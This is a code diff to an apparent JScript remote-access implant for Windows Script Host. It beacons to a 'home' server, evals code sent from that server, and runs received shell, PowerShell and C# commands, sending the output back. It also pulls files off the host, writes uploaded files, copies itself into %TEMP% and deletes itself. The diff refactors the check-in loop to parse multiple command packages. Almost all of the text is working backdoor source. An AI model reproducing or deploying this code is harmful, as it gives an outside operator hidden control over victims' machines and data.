@@ -31,8 +31,8 @@ if(fso.FileExists(selfpath))
   {
     //Read data from self script file
     var fd = fso.OpenTextFile(selfpath)
-	  var selfdata = fd.ReadAll();
-	  fd.close()
+    var selfdata = fd.ReadAll();
+    fd.close()
     //Delete our own script file
     fso.DeleteFile(selfpath, true)
   }
@@ -67,22 +67,22 @@ function post(home, response) {
 }
 
 function writebinfile(filename, content) {
-	var stream = WScript.CreateObject("ADODB.Stream")
-	stream.Open()	
-	stream.Type = 1 //adTypeBinary
-	stream.Write(content)
-	stream.SaveToFile(filename)
-	stream.Close()
+  var stream = WScript.CreateObject("ADODB.Stream")
+  stream.Open()	
+  stream.Type = 1 //adTypeBinary
+  stream.Write(content)
+  stream.SaveToFile(filename)
+  stream.Close()
 }
 
 function readbinfile(filename) {
-	var stream = WScript.CreateObject("ADODB.Stream")
-	stream.Open()
-	stream.Type = 1 //adTypeBinary
-	stream.LoadFromFile(filename)
-	var bytes = stream.Read()
-	stream.Close()
-	return bytes
+  var stream = WScript.CreateObject("ADODB.Stream")
+  stream.Open()
+  stream.Type = 1 //adTypeBinary
+  stream.LoadFromFile(filename)
+  var bytes = stream.Read()
+  stream.Close()
+  return bytes
 }
 
 function str2bin(data) {
@@ -133,16 +133,17 @@ function b64d(data, type) {
 }
 
 //Main
+var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin
 while(true)
 {
   //try
   //{
     var retval = ""
-    var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }';
     var serverMsg = post(home, checkin);
-    var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0]
+    var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0] // pull out json from http msg
     // Convert json string to json object
     eval("jsObject="+jsondata);
+    checkin = '{ "p":[ ' // start building json response string
 
     // Supports running extra functions once per loop ... right before checking for cmnd
     if(runextra) {
@@ -150,104 +151,114 @@ while(true)
         eval(extrafunc[i])
       }
     }
-    if(jsObject.p[0].cmnd)
-    {
-      var rettype = "retval"
-      var cmnd = jsObject.p[0].cmnd
-      //kill
-      if(cmnd == "quit") {
-        if(fso.FileExists(selfpath)) {
-          fso.DeleteFile(selfpath, true)
+
+    // loop thru all packages 
+    packages = jsObject.p
+    for(var p in packages) {
+      if(packages[p].id == id) { // if this is our package (id = our id)
+        if(packages[p].cmnd) {
+          var rettype = "retval"
+          var cmnd = packages[p].cmnd
+
+          //kill
+          if(cmnd == "quit") {
+            if(fso.FileExists(selfpath)) {
+              fso.DeleteFile(selfpath, true)
+            }
+            WScript.Quit(1);
+          }
+
+          //spawn: writes js to %TEMP%
+          else if(cmnd == "spawn") {
+            fd = fso.CreateTextFile(temp+"\\"+id+".js")
+            fd.WriteLine(selfdata)
+            fd.close()
+            runner.Run(temp+"\\"+id+".js")
+            retval = "[+] Spawn success..."
+          }
+
+          else if((cmnd.split(" ")[0] == "ev")) {
+            retval = eval(b64d(cmnd.split(" ")[1]))
+          }
+
+          //psh and cs
+          else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
+             fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
+             msb = cmnd.split(" ")[1]
+             msbdata = b64d(cmnd.split(" ")[2], "txt")
+             fd.WriteLine(msbdata)
+             fd.close()
+             if(cmnd.split(" ")[0] == "shc") {
+               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+               retval = "[*] Shc cmnd appeared successful"
+             }
+             else {
+               runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
+             }
+             if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+               fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+               retval = fd.ReadAll()
+               fd.close()
+               fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+             }
+             if(fso.FileExists(temp + "\\" + id + ".txt")) {
+               fso.DeleteFile(temp + "\\" + id + ".txt", true)
+            }
+          }
+              
+          else if(cmnd.split(" ")[0] == "dl") {
+            var array = cmnd.split(" ")
+            array.shift() //Cuts off the first element in the array
+            var filepath = array.join(" ")
+            if(fso.FileExists(filepath)) {
+              retval = readbinfile(filepath)
+              rettype = "dl"
+            }
+            else {
+              retval = "[!] Could not read file: " + filepath
+            }
+          }
+
+          else if(cmnd.split(" ")[0] == "up") {
+            try {
+              var array = cmnd.split(" ")
+              content = b64d(array[1], "bin")
+              array.shift()
+              array.shift()
+              filename = array.join(" ")
+              writebinfile(filename, content)
+              retval = "[*] File uploaded: " + filename
+            }
+            catch (e) {
+              retval = "[-] Could not upload file: " + filename
+            }
+          }
+
+          //credit to nate and 0sum
+          else {
+            runner.Run(cs +" /c " + cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+      	    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+              try {
+                fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+                retval = fd.ReadAll()
+                fd.close()
+                fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+              }
+              catch (e) { }
+            }
+          }
+          
+          if(retval == "") {
+            retval = "[*] No results to return or error getting result data"
+          }
+          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
+          packages[p].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
+        } 
+
+        else { // cmnd is blank
+          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }'; // idle response
         }
-        WScript.Quit(1);
       }
-
-      //spawn: writes js to %TEMP%
-      else if(cmnd == "spawn") {
-        fd = fso.CreateTextFile(temp+"\\"+id+".js")
-        fd.WriteLine(selfdata)
-        fd.close()
-        runner.Run(temp+"\\"+id+".js")
-        retval = "[+] Spawn success..."
-      }
-
-      else if((cmnd.split(" ")[0] == "ev")) {
-        retval = eval(b64d(jsObject.cmnd.split(" ")[1]))
-      }
-
-      //psh and cs
-      else if((cmnd.split(" ")[0] == "psh") || (cmnd.split(" ")[0] == "cs") || (cmnd.split(" ")[0] == "shc")) {
-         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
-         msb = cmnd.split(" ")[1]
-         msbdata = b64d(cmnd.split(" ")[2], "txt")
-         fd.WriteLine(msbdata)
-         fd.close()
-         if(cmnd.split(" ")[0] == "shc") {
-           runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
-           retval = "[*] Shc cmnd appeared successful"
-         }
-         else {
-           runner.Run(msb + " " + temp + "\\" + id + ".txt", 0, true)
-         }
-         if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-           fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-           retval = fd.ReadAll()
-           fd.close()
-           fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-         }
-        if(fso.FileExists(temp + "\\" + id + ".txt")) {
-          fso.DeleteFile(temp + "\\" + id + ".txt", true)
-        }
-      }
-	  
-      else if(cmnd.split(" ")[0] == "dl") {
-        var array = cmnd.split(" ")
-        array.shift() //Cuts off the first element in the array
-        var filepath = array.join(" ")
-        if(fso.FileExists(filepath)) {
-          retval = readbinfile(filepath)
-          rettype = "dl"
-        }
-        else {
-          retval = "[!] Could not read file: " + filepath
-        }
-      }
-
-	  	else if(cmnd.split(" ")[0] == "up") {
-                  try {
-                    var array = cmnd.split(" ")
-                    content = b64d(array[1], "bin")
-                    array.shift()
-                    array.shift()
-                    filename = array.join(" ")
-                    writebinfile(filename, content)
-                    retval = "[*] File uploaded: " + filename
-                  }
-                  catch (e) {
-                    retval = "[-] Could not upload file: " + filename
-                  }
-                }
-
-	    //credit to nate and 0sum
-	    else {
-        runner.Run(cs +" /c " + cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
-		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-                      try {
-		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-                        retval = fd.ReadAll()
-		        fd.close()
-		        fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-                      }
-                      catch (e) { }
-		    }
-      }
-      if(retval == "") {
-        retval = "[*] No results to return or error getting result data"
-      }
-      var resp = '{ "p":[ {"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
-      jsObject.p[0].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
-      
-      post(home, resp)
     }
   //}
   //catch (e) {
